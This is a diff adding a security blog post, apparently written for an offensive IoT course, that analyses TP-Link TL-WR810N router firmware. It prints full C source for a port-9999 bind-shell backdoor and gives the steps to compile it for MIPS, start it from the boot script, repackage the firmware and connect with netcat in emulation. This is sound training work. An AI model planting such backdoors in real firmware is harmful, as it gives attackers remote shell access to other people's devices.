@@ -1,0 +1,534 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Brett Lischalk | TP-Link TL-WR810N Firmware Analysis</title>
+  <meta name="description" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="TP-Link TL-WR810N Firmware Analysis">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="http://localhost:4000/posts/tplink-tlwr810n-firmware-analysis">
+  <meta property="og:description" content="">
+  <meta property="og:site_name" content="Brett Lischalk">
+  <meta property="og:image" content="http://localhost:4000/assets/og-image.jpg">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="http://localhost:4000/posts/tplink-tlwr810n-firmware-analysis">
+  <meta name="twitter:title" content="TP-Link TL-WR810N Firmware Analysis">
+  <meta name="twitter:description" content="">
+  <meta name="twitter:image" content="http://localhost:4000/assets/og-image.jpg">
+
+  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+  <link href="http://localhost:4000/feed.xml" type="application/rss+xml" rel="alternate" title="Brett Lischalk Last 10 blog posts" />
+
+  
+    <link type="text/css" rel="stylesheet" href="/assets/dark.css">
+  
+</head>
+
+<body>
+  <main role="main">
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav reveal">
+  <a href="/" class="header-logo" title="Brett Lischalk">Brett Lischalk</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <span class="icon icon-android-person"></span>
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/blischalk" target="_blank" title="Twitter">
+          <span class="icon icon-social-twitter"></span>
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a href="https://github.com/blischalk" target="_blank" title="GitHub">
+          <span class="icon icon-social-github"></span>
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/brett-lischalk-3104537" target="_blank" title="LinkedIn">
+          <span class="icon icon-social-linkedin"></span>
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a href="mailto:brett@brettlischalk.com" target="_blank" title="Email">
+          <span class="icon icon-at"></span>
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="/feed.xml" target="_blank" title="RSS">
+          <span class="icon icon-social-rss"></span>
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+        <article class="article reveal">
+          <header class="article-header">
+            <h1>TP-Link TL-WR810N Firmware Analysis</h1>
+            <div class="article-list-footer">
+              <span class="article-list-date">
+                July 5, 2017
+              </span>
+              <span class="article-list-divider">-</span>
+              <span class="article-list-minutes">
+                
+                
+                  7 minute read
+                
+              </span>
+              <span class="article-list-divider">-</span>
+              <div class="article-list-tags">
+                
+                  <a href="/tag/firmware">firmware</a>
+                
+                  <a href="/tag/analysis">analysis</a>
+                
+                  <a href="/tag/dlink">dlink</a>
+                
+              </div>
+            </div>
+          </header>
+
+          <div class="article-content">
+            <p>This blog post has been created for completing the requirements of the
+SecurityTube Offensive Internet of Things course.</p>
+
+<p><a href="http://www.securitytube-training.com/online-courses/offensive-internet-of-things-exploitation/index.html">Offensive Internet Of Things Exploitation</a></p>
+
+<p>Student ID: IoTE- 778</p>
+
+<h2 id="overview">Overview</h2>
+
+<p>For one of the projects for the Offensive Internet Of Things
+Exploitation final exam I decided to try to analyze the firmware for
+the
+<a href="http://www.tp-link.com/us/download/TL-WR810N.html#Firmware">TP-Link TL-WR810N Router</a>.</p>
+
+<p><img src="/assets/Firmware/tplinkwr810n.png" alt="TL-WR810N Router" />
+<img src="/assets/Firmware/tplinkwr810nfirmwaredownload.png" alt="TL-WR810N Router Firmware Download" /></p>
+
+<p>My goals for this project were to:</p>
+
+<ul>
+  <li>Successfully extract the filesystem from the firmware</li>
+  <li>Re-package the firmware with a backdoor corresponding to the correct
+architecture</li>
+  <li>Emulate the firmware using Firmadyne</li>
+  <li>Identify any interesting security issues</li>
+</ul>
+
+<h2 id="filesystem-extraction">Filesystem Extraction</h2>
+
+<p>Filesystem extraction was completed easy enough using the
+<a href="https://github.com/mirror/firmware-mod-kit">firmware-mod-kit</a>. I
+initially extracted the firmware using binwalk but had issues when
+trying to re-build the firmware after manipulating it.</p>
+
+<p><code class="highlighter-rouge">sudo ./extract-firmware.sh wr810nv2_us_3_16_9_up_boot\(160509\).bin</code></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>oit@ubuntu:~/tools/firmware-mod-kit$ sudo ./extract-firmware.sh wr810nv2_us_3_16_9_up_boot\(160509\).bin 
+Firmware extraction successful!
+
+.. snip ..
+
+Firmware parts can be found in '/home/oit/tools/firmware-mod-kit/wr810nv2_us_3_16_9_up_boot(160509)/*'
+oit@ubuntu:~/tools/firmware-mod-kit$
+</code></pre>
+</div>
+
+<p><img src="/assets/Firmware/ExtractTplinkwr810n.png" alt="Extract Filesystem for TL-WR810N Router Firmware" /></p>
+
+<p>From the extraction output we learn that:</p>
+
+<ul>
+  <li>That the U-Boot bootloader is being used</li>
+  <li>The file system is big endian</li>
+  <li>The CPU is a MIPS architecture</li>
+  <li>The Squashfs is being used</li>
+</ul>
+
+<p>To verify the endianess we can use <code class="highlighter-rouge">readelf</code>:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ readelf -a bin/busybox | less
+
+ELF Header:
+  Magic:   7f 45 4c 46 01 02 01 00 00 00 00 00 00 00 00 00
+  Class:                             ELF32
+  Data:                              2's complement, big endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              EXEC (Executable file)
+  Machine:                           MIPS R3000
+  Version:                           0x1
+  Entry point address:               0x404500
+  Start of program headers:          52 (bytes into file)
+  Start of section headers:          0 (bytes into file)
+  Flags:                             0x70001007, noreorder, pic, cpic, o32, mips32r2
+  Size of this header:               52 (bytes)
+  Size of program headers:           32 (bytes)
+  Number of program headers:         9
+  Size of section headers:           0 (bytes)
+  Number of section headers:         0
+  Section header string table index: 0
+</code></pre>
+</div>
+
+<p>This information will be useful for creating a backdoor and emulating
+the firmware later.</p>
+
+<h2 id="re-package-the-firmware-with-a-backdoor">Re-package The Firmware With A Backdoor</h2>
+
+<p>Now that we have successfully extracted the firmware, the next step is
+to re-package the firmware with a backdoor corresponding to the
+correct architecture. To do this we will first need to:</p>
+
+<ul>
+  <li>Find a backdoor that we want to incorporate</li>
+  <li>Compile the backdoor under the correct achitecture (MIPS)</li>
+  <li>Setup the firmware so that it starts the backdoor during the boot process</li>
+  <li>Re-package the firmware</li>
+  <li>Test that the backdoor actually works</li>
+</ul>
+
+<h3 id="find-a-backdoor-to-incorporate">Find A Backdoor To Incorporate</h3>
+
+<p>The IoT course provides an example backdoor c program that we will use
+for this exercise. The backdoor is the following:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/* Bindshell for Embedded system running Busybox
+Author - Vivek Ramachandran
+http://pentesteracademy.com
+http://securitytube-training.com
+http://securitytube.net
+
+*/</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+</span>
+<span class="cp">#define SERVER_PORT	9999
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="kt">int</span> <span class="n">serverfd</span><span class="p">,</span> <span class="n">clientfd</span><span class="p">,</span> <span class="n">server_pid</span><span class="p">,</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">banner</span> <span class="o">=</span> <span class="s">"[~] Welcome to @OsandaMalith's Bind Shell</span><span class="se">\n</span><span class="s"> Welcome to Offensive IoT Exploitation</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"/bin/busybox"</span><span class="p">,</span> <span class="s">"sh"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span> <span class="p">};</span>
+	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server</span><span class="p">,</span> <span class="n">client</span><span class="p">;</span>
+	<span class="n">socklen_t</span> <span class="n">len</span><span class="p">;</span>
+
+	<span class="n">server</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+	<span class="n">server</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">SERVER_PORT</span><span class="p">);</span>
+	<span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
+
+	<span class="n">serverfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">bind</span><span class="p">(</span><span class="n">serverfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">server</span><span class="p">));</span>
+	<span class="n">listen</span><span class="p">(</span><span class="n">serverfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    	<span class="n">len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="p">);</span>
+    	<span class="n">clientfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">serverfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
+        <span class="n">server_pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">server_pid</span><span class="p">)</span> <span class="p">{</span>
+        	<span class="n">write</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="n">banner</span><span class="p">,</span>  <span class="n">strlen</span><span class="p">(</span><span class="n">banner</span><span class="p">));</span>
+	        <span class="k">for</span><span class="p">(;</span> <span class="n">i</span> <span class="o">&lt;</span><span class="mi">3</span> <span class="cm">/*u*/</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+	        <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/busybox"</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span><span class="p">);</span>
+	        <span class="n">close</span><span class="p">(</span><span class="n">clientfd</span><span class="p">);</span>
+    	<span class="p">}</span> <span class="n">close</span><span class="p">(</span><span class="n">clientfd</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This bindshell binds to port 9999 and waits for a connection.</p>
+
+<h3 id="compile-the-backdoor-under-the-correct-architecture">Compile The Backdoor Under The Correct Architecture</h3>
+
+<p>Now that we know what backdoor we would like to use, we must compile
+it for the MIPS architecture. We can do this using
+<a href="https://buildroot.uclibc.org/">buildroot</a>. After copying the
+bindshell into buildroot we statically compile with gcc using:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>./mips-buildroot-linux-uclibc-gcc bindshell.c -static -o bindshell
+</code></pre>
+</div>
+
+<h3 id="test-that-the-backdoor-works">Test That The Backdoor Works</h3>
+
+<p>We can test that the bindshell actuall works using qemu to emulate:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>sudo chroot . ./qemu-mips-static bindshell
+</code></pre>
+</div>
+
+<p>And then nc to make the connection to port 9999:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>oit@ubuntu:~/tools$ nc -nv 127.0.0.1 9999
+Connection to 127.0.0.1 9999 port [tcp/*] succeeded!
+[~] Welcome to @OsandaMalith's Bind Shell
+</code></pre>
+</div>
+
+<p>Running commands at this point doesn’t actually work because
+<code class="highlighter-rouge">bin/busybox</code> is not actually available.</p>
+
+<p>Ok. It seems like the bindshell should work. Next we need to get it to
+start when the firmware boots.</p>
+
+<h3 id="start-the-backdoor-during-the-boot-process">Start The Backdoor During The Boot Process</h3>
+
+<p>After looking through the rootfs we come across the following:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ cat etc/rc.d/rcS
+
+.. snip ..
+
+#
+# Start Our Router Program
+#
+
+/usr/bin/httpd &amp;
+
+.. snip ..
+</code></pre>
+</div>
+
+<p>We can see that thr rcS script appears to start the httpd webserver
+during the boot process. This seems like a good place to hook up our
+bindshell. We will update the startup script with the following:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ cat etc/rc.d/rcS
+
+.. snip ..
+
+#
+# Start Our Router Program
+#
+
+
+/usr/bin/httpd &amp;
+
+.. snip ..
+
+
+#
+# Start our Bindshell
+#
+
+/usr/bin/bindshell &amp;
+</code></pre>
+</div>
+
+<p>We will also need to move our bindshell into that location.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ sudo cp ../../bindshell usr/bin/
+$ ls -la usr/bin
+total 1704
+drwxr-xr-x 2 root root    4096 Jul  5 19:19 .
+drwxr-xr-x 4 root root    4096 May  8  2016 ..
+lrwxrwxrwx 1 root root      17 Jul  5 15:32 [ -&gt; ../../bin/busybox
+lrwxrwxrwx 1 root root      17 Jul  5 15:32 arping -&gt; ../../bin/busybox
+-rwxr-xr-x 1 root root   51266 Jul  5 19:19 bindshell
+-rwxr-xr-x 1 root root 1568272 May  8  2016 httpd
+-rwxr-xr-x 1 root root  114408 May  8  2016 lld2d
+lrwxrwxrwx 1 root root      17 Jul  5 15:32 logger -&gt; ../../bin/busybox
+lrwxrwxrwx 1 root root      17 Jul  5 15:32 test -&gt; ../../bin/busybox
+lrwxrwxrwx 1 root root      17 Jul  5 15:32 tftp -&gt; ../../bin/busybox
+</code></pre>
+</div>
+
+<p>After our startup script is modified and our binary is in place, we
+can re-package our firmware.  We use the firmware-mode-kit build-firmware
+script for this:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ sudo ./build-firmware.sh wr810nv2_us_3_16_9_up_boot\(160509\) -nopad -min
+
+.. snip ..
+
+Done
+Finished!
+New firmware image has been saved to:
+/home/oit/tools/firmware-mod-kit/wr810nv2_us_3_16_9_up_boot(160509)/new-firmware.bin
+</code></pre>
+</div>
+
+<h2 id="emulate-the-modified-firmware-with-firmadyne">Emulate The Modified Firmware with Firmadyne</h2>
+
+<p>The moment of truth is running the modified firmware using Firmadyne. We can use
+the <a href="https://github.com/attify/firmware-analysis-toolkit">Firmware Analysis Toolkit</a>
+to speed up the process:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ ./fat.py
+
+.. snip ..
+
+
+Warning: invalid flag 0x0000 of partition table 4 will be corrected by w(rite)
+mke2fs 1.42.9 (4-Feb-2014)
+Please check the makeImage function
+Everything is done for the image id 6
+Setting up the network connection
+Password for user firmadyne:
+qemu: terminating on signal 2 from pid 13694
+Querying database for architecture... mipseb
+Running firmware 6: terminating after 60 secs...
+Bad SWSTYLE=0x04
+Bad SWSTYLE=0x04
+Inferring network...
+Interfaces: [('br0', '192.168.0.254')]
+Done!
+
+Running the firmware finally :
+</code></pre>
+</div>
+
+<p>Verify that the firmware is actually running in a browser:</p>
+
+<p><img src="/assets/Firmware/tplinkwr810nFirmwareRunning.png" alt="TL-WR810N Router" /></p>
+
+<p>Use nmap to see if our bindshell is listening:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ nmap 192.168.0.254
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2017-07-06 09:18 PDT
+Nmap scan report for 192.168.0.254
+Host is up (0.0036s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+1900/tcp open  upnp
+9999/tcp open  abyss
+
+Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds
+</code></pre>
+</div>
+
+<p>Connect to the bindshell using netcat:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ nc -nv 192.168.0.254 9999
+Connection to 192.168.0.254 9999 port [tcp/*] succeeded!
+[~] Welcome to @OsandaMalith's Bind Shell
+ls
+bin
+dev
+etc
+firmadyne
+lib
+linuxrc
+lost+found
+mnt
+proc
+root
+sbin
+sys
+tmp
+usr
+var
+web
+</code></pre>
+</div>
+
+<h2 id="identify-any-interesting-security-issues">Identify Any Interesting Security Issues</h2>
+
+<p>I was unable to find anything very interesting but I did find one
+thing. The minimum password requirements for this router are extremely
+weak:</p>
+
+<p><img src="/assets/Firmware/tplinkwr810nPasswordReq.png" alt="TL-WR810N Router" /></p>
+
+<p>A password policy that supports a length of 1 is extremely weak. In
+todays world a password of &gt;12 is considered good and &gt;14 even
+better. The router firmware can’t support a password any longer than
+15 which is almost the recommended industry standard minimum.</p>
+
+<p>Furthermore, this password policy does not enforce any complexity
+requirements such as special characters, numbers, etc.</p>
+
+          </div>
+
+          <div class="article-share">
+            
+            <a href="" title="Share on Twitter" onclick="window.open('https://twitter.com/home?status=TP-Link TL-WR810N Firmware Analysis - http://localhost:4000/posts/tplink-tlwr810n-firmware-analysis by @blischalk', 'newwindow', 'width=500, height=225'); return false;">
+              <span class="icon icon-social-twitter"></span>
+            </a>
+            <a href="" title="Share on Facebook" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/posts/tplink-tlwr810n-firmware-analysis', 'newwindow', 'width=500, height=500'); return false;">
+              <span class="icon icon-social-facebook"></span>
+            </a>
+            <a href="" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/posts/tplink-tlwr810n-firmware-analysis', 'newwindow', 'width=550, height=400'); return false;">
+              <span class="icon icon-social-googleplus"></span>
+            </a>
+          </div>
+
+          <a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional" target="_blank">
+            <img src="/assets/offsec-student-certified-emblem-rgb-oscp.png" />
+          </a>
+          <a href="https://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/" title="Offensive Security Certified Expert" target="_blank">
+            <img src="/assets/offsec-student-certified-emblem-rgb-osce.png"" />
+          </a>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script>
+              (function() {
+                  var d = document, s = d.createElement('script');
+                  s.src = '//blischalkblog.disqus.com/embed.js';
+                  s.setAttribute('data-timestamp', +new Date());
+                  (d.head || d.body).appendChild(s);
+              })();
+            </script>
+            <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+          
+        </article>
+        <footer class="footer reveal">
+  <p>
+    Site content by: <a href="/about" title="About me">Brett Lischalk</a>.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  <script type="text/javascript" src="/assets/vendor.js"></script>
+<script type="text/javascript" src="/assets/application.js"></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.16/webfont.js"></script>
+<script>
+  WebFont.load({
+    google: {
+      families: ['Cormorant Garamond:700', 'Lato:300,400,700']
+    }
+  });
+</script>
+
+
+  <script>
+    window.ga=function(){ga.q.push(arguments)};ga.q=[];ga.l=+new Date;
+    ga('create','UA-4121143-2','auto');ga('send','pageview')
+  </script>
+  <script src="https://www.google-analytics.com/analytics.js" async defer></script>
+
+
+</body>
+</html>
